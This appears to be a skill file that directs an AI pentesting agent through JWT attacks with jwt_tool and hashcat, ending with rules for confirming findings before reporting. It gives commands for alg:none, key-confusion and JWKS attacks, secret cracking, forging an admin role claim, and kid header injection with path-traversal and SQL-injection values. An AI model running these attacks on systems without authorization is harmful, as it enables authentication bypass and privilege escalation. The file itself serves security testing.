---
name: jwt-analysis
description: JWT token analysis and exploitation. Use when JWT authentication is detected. Covers algorithm attacks, claim tampering, secret cracking, and header injection.
allowed-tools: Read, Grep, Glob, Bash
---

# JWT Analysis Skill

## When to Use
- JWT tokens detected in Authorization headers, cookies, or request bodies

## Analysis Steps

### 1. Decode and Inspect
    python3 jwt_tool.py TOKEN

### 2. Attack Suite
- alg:none: python3 jwt_tool.py TOKEN -X a (CVE-2015-9235)
- Null signature: python3 jwt_tool.py TOKEN -X n (CVE-2020-28042)
- Blank password: python3 jwt_tool.py TOKEN -X b
- Key confusion RS256->HS256: python3 jwt_tool.py TOKEN -X k -pk public.pem (CVE-2016-5431)
- JWKS spoofing: python3 jwt_tool.py TOKEN -X s
- JWKS injection: python3 jwt_tool.py TOKEN -X i (CVE-2018-0114)

### 3. Secret Cracking
    python3 jwt_tool.py TOKEN -C -d wordlists/jwt-secrets.txt
    hashcat -a 0 -m 16500 jwt.txt wordlists/jwt-secrets.txt

### 4. Claim Tampering
    python3 jwt_tool.py TOKEN -I -pc role -pv admin -S hs256 -p "secret"

### 5. Header Injection
    python3 jwt_tool.py TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""
    python3 jwt_tool.py TOKEN -I -hc kid -hv "x]UNION SELECT key-- " -S hs256 -p "key"

### 6. Full Playbook
    python3 jwt_tool.py -t https://target.com/ -rc "jwt=TOKEN" -M pb

## Validate & Promote

Findings from this skill are born `theoretical` (see the validation layer in the repo-root `CLAUDE.md`). They do NOT enter a report or external submission until promoted to `confirmed` with `scripts/validate-finding.sh`, after the independent check below.

- **Independent check for this class:** The forged/tampered token must be ACCEPTED by a protected endpoint (200 with privileged data) - not merely 'no signature error'. Show the same request rejected with an untampered/invalid token.
- Only `confirmed` findings ship. `validated` = reproduced but not independently confirmed.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent specter \
  --id SPE-NNN --state confirmed --method manual-repro \
  --negative-control "<what you proved, and the control result>" --by specter
```
